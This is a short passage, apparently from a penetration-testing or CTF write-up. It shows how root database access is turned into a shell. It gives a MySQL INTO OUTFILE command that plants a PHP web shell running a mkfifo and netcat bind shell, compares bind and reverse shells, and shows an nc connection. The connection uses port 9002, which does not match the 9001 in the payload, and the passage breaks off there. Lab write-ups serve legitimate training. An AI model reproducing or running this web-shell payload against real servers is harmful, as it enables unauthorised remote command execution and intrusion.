...
After connecting to the database as root, we start a bind shell with the following command:

```
SELECT '<?php system("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f"); ?>' INTO OUTFILE '/var/www/forum/templates_c/bind.php'
```

Bind Shell:
- Opens a port on the target machine and waits for the attacker to connect
- Advantage: Simple setup
- Disadvantage: Firewalls typically block incoming connections

Reverse Shell:
- The target machine connects back to the attacker's machine
- Advantage: Easier to bypass firewalls
- Disadvantage: Requires the attacker to have an accessible IP


Then we access the bind.php page and in the terminal:

```
 ~  nc 192.168.193.128 9002
